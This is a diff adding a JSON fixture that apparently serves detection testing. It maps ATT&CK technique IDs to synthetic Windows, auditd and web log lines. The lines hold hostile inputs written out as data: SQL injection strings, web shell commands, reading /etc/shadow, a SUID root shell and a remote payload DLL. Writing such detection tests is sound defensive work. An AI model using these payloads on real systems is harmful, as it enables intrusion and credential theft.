@@ -1,0 +1,147 @@
+{
+  "T1003.006": [
+    "windows:security",
+    [
+      "EventCode=4662 Account=administrator Properties=Replication-Dir-Replication-Right ObjectClass=domainDNS",
+      "EventCode=4662 Account=svc_backup Properties=Replication-Dir-Replication-Right ObjectClass=domainDNS"
+    ]
+  ],
+  "T1021.002": [
+    "windows:security",
+    [
+      "EventCode=5140 ShareName=\\\\*\\ADMIN$ Account=administrator IpAddress=10.0.0.50",
+      "EventCode=4624 LogonType=3 Account=administrator IpAddress=10.0.0.50 LogonProcessName=NtLmSsp"
+    ]
+  ],
+  "T1046": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sS a2=-p a3=1-1000 a4=10.0.0.50",
+      "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sV a2=10.0.0.50"
+    ]
+  ],
+  "T1053.005": [
+    "windows:security",
+    [
+      "EventCode=4698 TaskName=\\SystemCheck Account=administrator TaskContent=<Exec><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Exec>",
+      "EventCode=7045 ServiceName=SystemUpdate ServiceType=user mode service StartType=auto start ImagePath=cmd.exe /c powershell"
+    ]
+  ],
+  "T1059": [
+    "windows:security",
+    [
+      "EventCode=4688 NewProcessName=C:\\Windows\\System32\\cmd.exe Account=SYSTEM Process_Command_Line=cmd.exe /c whoami",
+      "EventCode=4688 NewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Account=SYSTEM Process_Command_Line=powershell.exe -enc SQBFAFgA"
+    ]
+  ],
+  "T1059.004": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=root exe=/bin/bash a0=bash a1=-c a2=whoami",
+      "type=EXECVE uid=root exe=/bin/sh a0=sh a1=-c a2=id",
+      "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-i"
+    ]
+  ],
+  "T1068": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-c a2=./exploit",
+      "type=EXECVE uid=root exe=/bin/bash a0=bash a1=-c a2=id"
+    ]
+  ],
+  "T1078": [
+    "windows:security",
+    [
+      "EventCode=4624 LogonType=10 Account=administrator IpAddress=10.0.0.50 LogonProcessName=User32",
+      "EventCode=4648 Account=administrator TargetServer=DC01"
+    ]
+  ],
+  "T1083": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=www-data exe=/usr/bin/find a0=find a1=/ a2=-name a3=*.conf",
+      "type=EXECVE uid=www-data exe=/bin/ls a0=ls a1=-la a2=/etc/passwd"
+    ]
+  ],
+  "T1110.003": [
+    "windows:security",
+    [
+      "EventCode=4625 Account=user01 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
+      "EventCode=4625 Account=user02 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
+      "EventCode=4625 Account=user03 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
+      "EventCode=4771 Account=user01 IpAddress=10.0.0.50 PreAuthType=0x0"
+    ]
+  ],
+  "T1189": [
+    "web:access",
+    [
+      "10.0.0.50 GET /exploit-kit/landing.html HTTP/1.1 200",
+      "10.0.0.50 GET /payload.exe HTTP/1.1 200"
+    ]
+  ],
+  "T1190": [
+    "web:access",
+    [
+      "10.0.0.50 POST /login HTTP/1.1 200 \"username=admin&password=' OR 1=1--\"",
+      "10.0.0.50 GET /api/v1/users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 200",
+      "10.0.0.50 POST /upload HTTP/1.1 200 filename=shell.php Content-Type=application/x-php"
+    ]
+  ],
+  "T1210": [
+    "windows:security",
+    [
+      "EventCode=4688 NewProcessName=C:\\Windows\\System32\\rundll32.exe Account=SYSTEM Process_Command_Line=rundll32.exe \\\\10.0.0.50\\share\\payload.dll",
+      "EventCode=4624 LogonType=3 Account=SYSTEM IpAddress=10.0.0.50"
+    ]
+  ],
+  "T1505.003": [
+    "web:access",
+    [
+      "10.0.0.50 POST /uploads/shell.php HTTP/1.1 200 cmd=whoami",
+      "10.0.0.50 GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+    ]
+  ],
+  "T1548.001": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=root exe=/bin/chmod a0=chmod a1=+s a2=/tmp/rootshell",
+      "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-c a2=find / -perm -4000 2>/dev/null"
+    ]
+  ],
+  "T1552": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=www-data exe=/bin/cat a0=cat a1=/etc/shadow",
+      "type=EXECVE uid=www-data exe=/usr/bin/find a0=find a1=-name a2=.password*"
+    ]
+  ],
+  "T1558.003": [
+    "windows:security",
+    [
+      "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB",
+      "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_sql Account=svc_sql@PORTAL.LAB"
+    ]
+  ],
+  "T1558.004": [
+    "windows:security",
+    [
+      "EventCode=4768 PreAuthType=0 Account=svc_nopreauth@PORTAL.LAB",
+      "EventCode=4768 PreAuthType=0 Account=testuser@PORTAL.LAB"
+    ]
+  ],
+  "T1592": [
+    "linux:auditd",
+    [
+      "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sV a2=-p- a3=10.0.0.50",
+      "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-O a2=10.0.0.50"
+    ]
+  ],
+  "T1595": [
+    "web:access",
+    [
+      "10.0.0.50 GET / HTTP/1.1 200 \"Mozilla/5.0 (Nmap Scripting Engine)\"",
+      "10.0.0.50 GET /.env HTTP/1.1 404",
+      "10.0.0.50 GET /admin HTTP/1.1 200"
+    ]
+  ]
+}
